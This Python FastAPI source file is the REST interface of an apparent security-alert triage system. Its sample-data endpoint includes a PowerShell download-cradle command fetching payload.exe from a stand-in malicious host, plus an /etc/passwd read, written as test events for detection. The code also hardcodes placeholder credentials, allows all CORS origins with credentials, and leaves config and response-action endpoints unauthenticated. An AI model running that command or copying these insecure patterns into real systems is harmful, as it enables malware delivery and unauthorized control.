"""
Security Analysis API
安全分析系统的REST API接口
"""

from fastapi import FastAPI, HTTPException, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Dict, Any, Optional
import logging
import asyncio
from datetime import datetime

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from src.services.security_analysis_service import create_security_analysis_service


# 请求模型定义
class SecurityEventRequest(BaseModel):
    event_type: str = "security_alert"
    log_data: Dict[str, Any]
    metadata: Optional[Dict[str, Any]] = None


class BatchEventsRequest(BaseModel):
    events: List[SecurityEventRequest]


class ManualResponseRequest(BaseModel):
    entity_id: str
    entity_type: str
    actions: List[str]


class ConfigUpdateRequest(BaseModel):
    config: Dict[str, Any]


# 创建FastAPI应用
app = FastAPI(
    title="Security Alert Analysis System",
    description="安全告警日志研判系统API",
    version="1.0.0"
)

# 添加CORS中间件
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# 配置日志
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# 创建安全分析服务实例
analysis_service = None


@app.on_event("startup")
async def startup_event():
    """应用启动事件"""
    global analysis_service
    
    # 这里可以从配置文件或环境变量加载配置
    config = {
        'processing_config': {
            'enable_connection_expansion': True,
            'enable_risk_scoring': True,
            'enable_auto_response': True,
            'max_concurrent_processing': 10,
            'min_risk_threshold_for_response': 50.0
        },
        'response_config': {
            'firewall': {
                'api_endpoint': 'http://firewall-api:8080',
                'api_key': 'your-api-key'
            },
            'ad': {
                'ldap_server': 'ldap://ad-server:389',
                'admin_user': 'admin',
                'admin_password': 'password'
            },
            'edr': {
                'api_endpoint': 'http://edr-server:8080',
                'api_key': 'your-api-key'
            },
            'alert': {
                'email_server': 'smtp.company.com',
                'webhook_url': 'http://webhook-server/alerts'
            }
        }
    }
    
    analysis_service = create_security_analysis_service(config)
    logger.info("Security Analysis Service started successfully")


@app.get("/")
async def root():
    """根路径"""
    return {
        "service": "Security Alert Analysis System",
        "version": "1.0.0",
        "status": "running",
        "timestamp": datetime.now().isoformat()
    }


@app.get("/health")
async def health_check():
    """健康检查接口"""
    if analysis_service is None:
        raise HTTPException(status_code=503, detail="Service not initialized")
    
    health_status = await analysis_service.health_check()
    
    if health_status.get('service') == 'healthy':
        return health_status
    else:
        raise HTTPException(status_code=503, detail=health_status)


@app.post("/api/v1/analyze/event")
async def analyze_single_event(request: SecurityEventRequest):
    """分析单个安全事件"""
    if analysis_service is None:
        raise HTTPException(status_code=503, detail="Service not initialized")
    
    try:
        result = await analysis_service.analyze_security_event(
            log_data=request.log_data,
            event_type=request.event_type
        )
        
        return {
            "success": True,
            "data": result,
            "timestamp": datetime.now().isoformat()
        }
        
    except Exception as e:
        logger.error(f"Error analyzing event: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/v1/analyze/batch")
async def analyze_batch_events(request: BatchEventsRequest):
    """批量分析安全事件"""
    if analysis_service is None:
        raise HTTPException(status_code=503, detail="Service not initialized")
    
    try:
        # 转换请求数据
        events_data = [
            {
                "event_type": event.event_type,
                "log_data": event.log_data,
                "metadata": event.metadata
            }
            for event in request.events
        ]
        
        results = await analysis_service.batch_analyze_events(
            [event["log_data"] for event in events_data]
        )
        
        return {
            "success": True,
            "data": {
                "total_events": len(request.events),
                "results": results
            },
            "timestamp": datetime.now().isoformat()
        }
        
    except Exception as e:
        logger.error(f"Error in batch analysis: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/api/v1/entity/{entity_id}")
async def get_entity_details(entity_id: str, entity_type: str):
    """获取实体详细信息"""
    if analysis_service is None:
        raise HTTPException(status_code=503, detail="Service not initialized")
    
    try:
        entity_details = await analysis_service.get_entity_details(entity_id, entity_type)
        
        if entity_details is None:
            raise HTTPException(status_code=404, detail="Entity not found")
        
        return {
            "success": True,
            "data": entity_details,
            "timestamp": datetime.now().isoformat()
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error getting entity details: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/v1/response/manual")
async def manual_response_execution(request: ManualResponseRequest):
    """手动执行响应动作"""
    if analysis_service is None:
        raise HTTPException(status_code=503, detail="Service not initialized")
    
    try:
        results = await analysis_service.manual_response_execution(
            entity_id=request.entity_id,
            entity_type=request.entity_type,
            actions=request.actions
        )
        
        return {
            "success": True,
            "data": {
                "entity_id": request.entity_id,
                "entity_type": request.entity_type,
                "actions_executed": len(request.actions),
                "results": results
            },
            "timestamp": datetime.now().isoformat()
        }
        
    except Exception as e:
        logger.error(f"Error in manual response execution: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/api/v1/statistics")
async def get_processing_statistics():
    """获取处理统计信息"""
    if analysis_service is None:
        raise HTTPException(status_code=503, detail="Service not initialized")
    
    try:
        stats = analysis_service.get_processing_statistics()
        
        return {
            "success": True,
            "data": stats,
            "timestamp": datetime.now().isoformat()
        }
        
    except Exception as e:
        logger.error(f"Error getting statistics: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/v1/config")
async def update_configuration(request: ConfigUpdateRequest):
    """更新系统配置"""
    if analysis_service is None:
        raise HTTPException(status_code=503, detail="Service not initialized")
    
    try:
        analysis_service.update_configuration(request.config)
        
        return {
            "success": True,
            "message": "Configuration updated successfully",
            "timestamp": datetime.now().isoformat()
        }
        
    except Exception as e:
        logger.error(f"Error updating configuration: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/api/v1/config")
async def get_current_configuration():
    """获取当前配置"""
    if analysis_service is None:
        raise HTTPException(status_code=503, detail="Service not initialized")
    
    try:
        stats = analysis_service.get_processing_statistics()
        
        return {
            "success": True,
            "data": {
                "configuration": stats.get("configuration", {}),
                "last_updated": datetime.now().isoformat()
            }
        }
        
    except Exception as e:
        logger.error(f"Error getting configuration: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# 测试用的示例数据生成接口
@app.get("/api/v1/test/sample-data")
async def generate_sample_data():
    """生成测试用的示例数据"""
    sample_events = [
        {
            "event_type": "network_anomaly",
            "log_data": {
                "src_ip": "192.168.1.100",
                "dst_ip": "10.0.0.50",
                "port": 443,
                "username": "john.doe",
                "timestamp": datetime.now().isoformat(),
                "bytes_transferred": 1048576,
                "connection_duration": 300,
                "is_anomaly": True,
                "anomaly_type": "unusual_data_transfer"
            }
        },
        {
            "event_type": "file_access",
            "log_data": {
                "username": "admin",
                "file_path": "/etc/passwd",
                "action": "read",
                "timestamp": datetime.now().isoformat(),
                "process_name": "cat",
                "is_system_file": True,
                "access_granted": True
            }
        },
        {
            "event_type": "process_execution",
            "log_data": {
                "process_name": "powershell.exe",
                "command_line": "powershell.exe -ExecutionPolicy bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://malicious.com/payload.exe', 'C:\\temp\\payload.exe')",
                "parent_process": "explorer.exe",
                "username": "user1",
                "timestamp": datetime.now().isoformat(),
                "is_anomaly": True,
                "anomaly_type": "suspicious_command"
            }
        },
        {
            "event_type": "login_event",
            "log_data": {
                "username": "service_account",
                "src_ip": "103.45.67.89",
                "destination": "ad-server.company.com",
                "login_method": "NTLM",
                "timestamp": datetime.now().isoformat(),
                "success": True,
                "is_anomaly": True,
                "anomaly_type": "unusual_login_location"
            }
        }
    ]
    
    return {
        "success": True,
        "data": {
            "sample_events": sample_events,
            "description": "These are sample security events for testing the analysis system"
        }
    }


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)